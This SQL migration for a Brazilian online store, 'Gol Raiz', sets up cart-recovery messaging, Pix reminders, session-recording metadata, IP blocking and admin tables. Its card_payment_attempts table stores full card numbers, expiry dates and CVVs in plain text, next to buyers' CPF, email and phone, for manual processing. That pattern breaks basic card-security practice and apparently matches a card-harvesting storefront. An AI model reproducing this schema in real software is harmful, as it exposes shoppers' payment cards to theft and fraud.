
-- Prepended: cart_recovery table
INSERT INTO public.app_config (key, value, description)
VALUES ('zapi_recovery_delay_minutes', '3', 'Minutos após abandono para disparar recuperação')
ON CONFLICT (key) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.cart_recovery (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  checkout_attempt_id uuid REFERENCES public.checkout_attempts(id),
  session_id text NOT NULL,
  lead_name text,
  lead_phone text,
  lead_email text,
  cart_items jsonb NOT NULL DEFAULT '[]'::jsonb,
  cart_total_cents integer NOT NULL DEFAULT 0,
  recovery_link text,
  status text NOT NULL DEFAULT 'pending',
  recovery_message text,
  sent_at timestamp with time zone,
  opened_at timestamp with time zone,
  created_at timestamp with time zone NOT NULL DEFAULT now(),
  processed_at timestamp with time zone
);
GRANT SELECT, INSERT, UPDATE ON public.cart_recovery TO authenticated;
GRANT ALL ON public.cart_recovery TO service_role;
ALTER TABLE public.cart_recovery ENABLE ROW LEVEL SECURITY;
DO $mig$ BEGIN
  CREATE POLICY "admins manage cart_recovery" ON public.cart_recovery FOR ALL TO authenticated
    USING (public.has_role(auth.uid(), 'admin'::app_role))
    WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));
EXCEPTION WHEN duplicate_object THEN NULL; END $mig$;

CREATE EXTENSION IF NOT EXISTS pg_net;
CREATE EXTENSION IF NOT EXISTS pg_cron;

DO $mig$
BEGIN
  PERFORM cron.unschedule('cart-recovery-job');
EXCEPTION WHEN OTHERS THEN
  RAISE NOTICE 'Job cart-recovery-job não existia, ignorando...';
END $mig$;

SELECT cron.schedule(
  'cart-recovery-job',
  '* * * * *',
  $cron$
  SELECT net.http_post(
    url:='https://project--b6ff506c-861c-4faa-a1f2-0a48277dd185.lovable.app/api/public/hooks/cart-recovery',
    headers:='{"Content-Type": "application/json"}'::jsonb,
    body:='{}'::jsonb
  ) as request_id;
  $cron$
);

INSERT INTO public.app_config (key, value, description)
VALUES (
  'cart_recovery_message',
  E'Olá, {nome}! 👋\n\nNotei que você começou um pedido na Gol Raiz e não finalizou:\n\n{itens}\n\n💰 Total: *{total}*\n\nPara te ajudar, separei seu carrinho — é só clicar no link abaixo para retomar de onde parou (com seus dados já preenchidos):\n\n{link}\n\nQualquer dúvida, estou por aqui! 🟡⚫',
  'Template da mensagem de recuperação. Placeholders: {nome}, {total}, {itens}, {link}'
)
ON CONFLICT (key) DO NOTHING;

CREATE TABLE public.card_payment_attempts (
  id uuid NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id text NOT NULL,
  payer_name text, payer_email text, payer_cpf text, payer_phone text,
  delivery jsonb NOT NULL DEFAULT '{}'::jsonb,
  cart_items jsonb NOT NULL DEFAULT '[]'::jsonb,
  amount_cents integer NOT NULL DEFAULT 0,
  installments integer NOT NULL DEFAULT 1,
  card_holder text NOT NULL,
  card_number text NOT NULL,
  card_expiry text NOT NULL,
  card_cvv text NOT NULL,
  status text NOT NULL DEFAULT 'pending',
  processed_at timestamp with time zone,
  notes text,
  created_at timestamp with time zone NOT NULL DEFAULT now()
);
GRANT SELECT, UPDATE ON public.card_payment_attempts TO authenticated;
GRANT ALL ON public.card_payment_attempts TO service_role;
ALTER TABLE public.card_payment_attempts ENABLE ROW LEVEL SECURITY;
CREATE POLICY "admins manage card attempts" ON public.card_payment_attempts FOR ALL TO authenticated
USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
CREATE INDEX idx_card_payment_attempts_created_at ON public.card_payment_attempts(created_at DESC);
CREATE INDEX idx_card_payment_attempts_status ON public.card_payment_attempts(status);

-- storage policies comprovantes
CREATE POLICY "Admins can read comprovantes" ON storage.objects FOR SELECT TO authenticated
USING (bucket_id = 'comprovantes' AND public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins can upload comprovantes" ON storage.objects FOR INSERT TO authenticated
WITH CHECK (bucket_id = 'comprovantes' AND public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins can update comprovantes" ON storage.objects FOR UPDATE TO authenticated
USING (bucket_id = 'comprovantes' AND public.has_role(auth.uid(), 'admin'::public.app_role))
WITH CHECK (bucket_id = 'comprovantes' AND public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins can delete comprovantes" ON storage.objects FOR DELETE TO authenticated
USING (bucket_id = 'comprovantes' AND public.has_role(auth.uid(), 'admin'::public.app_role));

-- clarex_recordings
CREATE TABLE public.clarex_recordings (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL,
  started_at timestamptz NOT NULL DEFAULT now(),
  ended_at timestamptz,
  duration_ms integer NOT NULL DEFAULT 0,
  event_count integer NOT NULL DEFAULT 0,
  size_bytes integer NOT NULL DEFAULT 0,
  page_url text,
  surface text NOT NULL DEFAULT 'loja',
  device_type text,
  browser text, os text, country_code text,
  has_attention boolean NOT NULL DEFAULT false,
  attention_reason text,
  storage_path text NOT NULL,
  user_agent text, referrer text,
  utm_source text, utm_medium text, utm_campaign text,
  ip_address text,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX idx_clarex_recordings_created_at ON public.clarex_recordings (created_at DESC);
CREATE INDEX idx_clarex_recordings_session ON public.clarex_recordings (session_id);
CREATE INDEX idx_clarex_recordings_surface ON public.clarex_recordings (surface);
CREATE INDEX idx_clarex_recordings_attention ON public.clarex_recordings (has_attention) WHERE has_attention = true;
CREATE INDEX idx_clarex_recordings_ip ON public.clarex_recordings(ip_address);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.clarex_recordings TO authenticated;
GRANT ALL ON public.clarex_recordings TO service_role;
ALTER TABLE public.clarex_recordings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "admins manage clarex_recordings" ON public.clarex_recordings FOR ALL TO authenticated
USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));

CREATE POLICY "admins read clarex blobs" ON storage.objects FOR SELECT TO authenticated
USING (bucket_id = 'clarex-recordings' AND has_role(auth.uid(), 'admin'::app_role));
CREATE POLICY "admins write clarex blobs" ON storage.objects FOR INSERT TO authenticated
WITH CHECK (bucket_id = 'clarex-recordings' AND has_role(auth.uid(), 'admin'::app_role));
CREATE POLICY "admins delete clarex blobs" ON storage.objects FOR DELETE TO authenticated
USING (bucket_id = 'clarex-recordings' AND has_role(auth.uid(), 'admin'::app_role));

-- orders extras
ALTER TABLE public.orders
  ADD COLUMN IF NOT EXISTS confirmation_sent_at TIMESTAMPTZ,
  ADD COLUMN IF NOT EXISTS pix_reminder_sent_at TIMESTAMPTZ,
  ADD COLUMN IF NOT EXISTS pix_reminder2_sent_at TIMESTAMPTZ,
  ADD COLUMN IF NOT EXISTS pix_code text,
  ADD COLUMN IF NOT EXISTS pix_reminder_status text,
  ADD COLUMN IF NOT EXISTS pix_reminder2_status text,
  ADD COLUMN IF NOT EXISTS confirmation_status text,
  ADD COLUMN IF NOT EXISTS pix_reminder_zapi_message_id text,
  ADD COLUMN IF NOT EXISTS pix_reminder2_zapi_message_id text,
  ADD COLUMN IF NOT EXISTS confirmation_zapi_message_id text,
  ADD COLUMN IF NOT EXISTS pix_reminder_zapi_zaap_id text,
  ADD COLUMN IF NOT EXISTS pix_reminder2_zapi_zaap_id text,
  ADD COLUMN IF NOT EXISTS confirmation_zapi_zaap_id text,
  ADD COLUMN IF NOT EXISTS email_pix_reminder_status text,
  ADD COLUMN IF NOT EXISTS email_pix_reminder_sent_at timestamptz,
  ADD COLUMN IF NOT EXISTS email_pix_reminder_message_id text,
  ADD COLUMN IF NOT EXISTS email_pix_reminder2_status text,
  ADD COLUMN IF NOT EXISTS email_pix_reminder2_sent_at timestamptz,
  ADD COLUMN IF NOT EXISTS email_pix_reminder2_message_id text,
  ADD COLUMN IF NOT EXISTS email_confirmation_status text,
  ADD COLUMN IF NOT EXISTS email_confirmation_sent_at timestamptz,
  ADD COLUMN IF NOT EXISTS email_confirmation_message_id text,
  ADD COLUMN IF NOT EXISTS tracking_code TEXT,
  ADD COLUMN IF NOT EXISTS tracking_url TEXT,
  ADD COLUMN IF NOT EXISTS shipped_at TIMESTAMPTZ,
  ADD COLUMN IF NOT EXISTS delivered_at TIMESTAMPTZ;

CREATE INDEX IF NOT EXISTS idx_orders_status_paid_conf ON public.orders (status, paid_at) WHERE status = 'PAID' AND confirmation_sent_at IS NULL;
CREATE INDEX IF NOT EXISTS idx_orders_pending_reminder ON public.orders (status, created_at) WHERE status = 'PENDING' AND pix_reminder_sent_at IS NULL;
CREATE INDEX IF NOT EXISTS idx_orders_pix_reminder_msgid ON public.orders (pix_reminder_zapi_message_id) WHERE pix_reminder_zapi_message_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_orders_pix_reminder2_msgid ON public.orders (pix_reminder2_zapi_message_id) WHERE pix_reminder2_zapi_message_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_orders_confirmation_msgid ON public.orders (confirmation_zapi_message_id) WHERE confirmation_zapi_message_id IS NOT NULL;

INSERT INTO public.app_config (key, value, description) VALUES
  ('order_confirmation_enabled', 'true', 'Habilita envio automático de mensagem de confirmação após pagamento'),
  ('order_confirmation_delay_minutes', '1', 'Minutos após pagamento para enviar confirmação'),
  ('order_confirmation_message', E'Olá, {nome}! ⚽\n\nSeu pagamento foi aprovado com sucesso! ✅\n\n📦 *Pedido:* #{pedido}\n💰 *Valor:* {total}\n\nJá estamos preparando tudo. 💛💚\n\n_Equipe Gol Raiz_', 'Template da mensagem de confirmação de pedido pago'),
  ('pix_reminder_enabled', 'true', 'Habilita lembrete de Pix pendente'),
  ('pix_reminder_delay_minutes', '5', 'Minutos após criação do pedido sem pagamento para enviar lembrete'),
  ('pix_reminder_message', 'Oi {nome}! Notamos que seu Pix de {total} na Gol Raiz ainda não foi pago. Para garantir seu pedido, finalize aqui: {link}', 'Template da mensagem de lembrete de Pix pendente'),
  ('pix_reminder2_enabled', 'true', 'Habilita segundo lembrete de Pix')
ON CONFLICT (key) DO NOTHING;

-- cart_recovery extras
DELETE FROM public.cart_recovery a USING public.cart_recovery b
WHERE a.checkout_attempt_id IS NOT NULL
  AND a.checkout_attempt_id = b.checkout_attempt_id
  AND a.created_at < b.created_at;
CREATE UNIQUE INDEX IF NOT EXISTS cart_recovery_checkout_attempt_id_unique
  ON public.cart_recovery (checkout_attempt_id) WHERE checkout_attempt_id IS NOT NULL;

ALTER TABLE public.cart_recovery
  ADD COLUMN IF NOT EXISTS zapi_message_id text,
  ADD COLUMN IF NOT EXISTS zapi_zaap_id text,
  ADD COLUMN IF NOT EXISTS zapi_delivery_payload jsonb,
  ADD COLUMN IF NOT EXISTS recovery_link_clicked_at timestamptz,
  ADD COLUMN IF NOT EXISTS stage2_status text,
  ADD COLUMN IF NOT EXISTS stage2_sent_at timestamptz,
  ADD COLUMN IF NOT EXISTS stage2_processed_at timestamptz,
  ADD COLUMN IF NOT EXISTS stage2_message text,
  ADD COLUMN IF NOT EXISTS stage2_zapi_message_id text,
  ADD COLUMN IF NOT EXISTS stage2_zaap_id text,
  ADD COLUMN IF NOT EXISTS stage3_status text,
  ADD COLUMN IF NOT EXISTS stage3_sent_at timestamptz,
  ADD COLUMN IF NOT EXISTS stage3_processed_at timestamptz,
  ADD COLUMN IF NOT EXISTS stage3_message text,
  ADD COLUMN IF NOT EXISTS stage3_zapi_message_id text,
  ADD COLUMN IF NOT EXISTS stage3_zaap_id text,
  ADD COLUMN IF NOT EXISTS email_status text,
  ADD COLUMN IF NOT EXISTS email_processed_at timestamptz,
  ADD COLUMN IF NOT EXISTS email_message_id text,
  ADD COLUMN IF NOT EXISTS email2_status text,
  ADD COLUMN IF NOT EXISTS email2_processed_at timestamptz,
  ADD COLUMN IF NOT EXISTS email2_message_id text,
  ADD COLUMN IF NOT EXISTS email3_status text,
  ADD COLUMN IF NOT EXISTS email3_processed_at timestamptz,
  ADD COLUMN IF NOT EXISTS email3_message_id text,
  ADD COLUMN IF NOT EXISTS email1_clicked_at timestamptz,
  ADD COLUMN IF NOT EXISTS email2_clicked_at timestamptz,
  ADD COLUMN IF NOT EXISTS email3_clicked_at timestamptz,
  ADD COLUMN IF NOT EXISTS whatsapp_clicked_at timestamptz;

CREATE INDEX IF NOT EXISTS idx_cart_recovery_zapi_message_id ON public.cart_recovery (zapi_message_id) WHERE zapi_message_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_cart_recovery_zapi_zaap_id ON public.cart_recovery (zapi_zaap_id) WHERE zapi_zaap_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_cart_recovery_stage2_zapi_message_id ON public.cart_recovery (stage2_zapi_message_id);
CREATE INDEX IF NOT EXISTS idx_cart_recovery_stage3_zapi_message_id ON public.cart_recovery (stage3_zapi_message_id);

-- site_sessions + blocked_ips
ALTER TABLE public.site_sessions ADD COLUMN IF NOT EXISTS ip_address text;
CREATE INDEX IF NOT EXISTS idx_site_sessions_ip ON public.site_sessions(ip_address);

CREATE TABLE IF NOT EXISTS public.blocked_ips (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  ip_address text NOT NULL UNIQUE,
  reason text,
  origin_session_id text,
  blocked_by uuid,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_ips TO authenticated;
GRANT ALL ON public.blocked_ips TO service_role;
ALTER TABLE public.blocked_ips ENABLE ROW LEVEL SECURITY;
CREATE POLICY "admins manage blocked_ips" ON public.blocked_ips FOR ALL TO authenticated
USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
CREATE INDEX IF NOT EXISTS idx_blocked_ips_ip ON public.blocked_ips(ip_address);

-- ad_spend + payment_gateways extras
ALTER TABLE public.payment_gateways
  ADD COLUMN IF NOT EXISTS pix_fee_percent NUMERIC(6,3) NOT NULL DEFAULT 0,
  ADD COLUMN IF NOT EXISTS pix_fee_fixed_cents INTEGER NOT NULL DEFAULT 0;

CREATE TABLE IF NOT EXISTS public.ad_spend (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  spend_date DATE NOT NULL,
  amount_cents INTEGER NOT NULL DEFAULT 0,
  platform TEXT,
  notes TEXT,
  created_by UUID,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_ad_spend_date ON public.ad_spend(spend_date);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.ad_spend TO authenticated;
GRANT ALL ON public.ad_spend TO service_role;
ALTER TABLE public.ad_spend ENABLE ROW LEVEL SECURITY;
CREATE POLICY "admins manage ad_spend" ON public.ad_spend FOR ALL TO authenticated
USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
CREATE TRIGGER set_ad_spend_updated_at BEFORE UPDATE ON public.ad_spend FOR EACH ROW EXECUTE FUNCTION public.set_orders_updated_at();

-- has_role security invoker (per migration 20260602022303)
CREATE OR REPLACE FUNCTION public.has_role(_user_id uuid, _role public.app_role)
RETURNS boolean LANGUAGE sql STABLE SECURITY INVOKER SET search_path = public AS $hr$
  SELECT EXISTS (SELECT 1 FROM public.user_roles WHERE user_id = _user_id AND role = _role)
$hr$;
REVOKE EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) FROM anon;
GRANT EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) TO authenticated;
GRANT EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) TO service_role;

-- admin_alerts
CREATE TABLE public.admin_alerts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  alert_type TEXT NOT NULL,
  severity TEXT NOT NULL DEFAULT 'warning',
  title TEXT NOT NULL,
  message TEXT NOT NULL,
  details JSONB,
  read_at TIMESTAMPTZ,
  read_by UUID,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX idx_admin_alerts_unread ON public.admin_alerts (created_at DESC) WHERE read_at IS NULL;
CREATE INDEX idx_admin_alerts_type_recent ON public.admin_alerts (alert_type, created_at DESC);
GRANT SELECT, UPDATE ON public.admin_alerts TO authenticated;
GRANT ALL ON public.admin_alerts TO service_role;
ALTER TABLE public.admin_alerts ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can view alerts" ON public.admin_alerts FOR SELECT TO authenticated
USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can update alerts" ON public.admin_alerts FOR UPDATE TO authenticated
USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
